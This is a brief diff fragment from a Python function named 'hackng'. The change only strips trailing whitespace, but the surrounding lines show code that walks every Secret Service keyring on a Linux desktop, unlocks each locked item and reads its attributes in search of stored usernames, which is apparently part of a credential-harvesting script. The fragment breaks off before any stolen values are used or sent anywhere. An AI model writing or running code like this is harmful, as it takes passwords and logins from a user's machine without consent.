@@ -8,7 +8,7 @@ def hackng():
     bus = secretstorage.dbus_init()
     for keyring in secretstorage.get_all_collections(bus):
         for item in keyring.get_all_items():
-            if item.is_locked(): 
+            if item.is_locked():
                 item.unlock()
             attr = item.get_attributes()
             if attr and 'username_value' in attr:
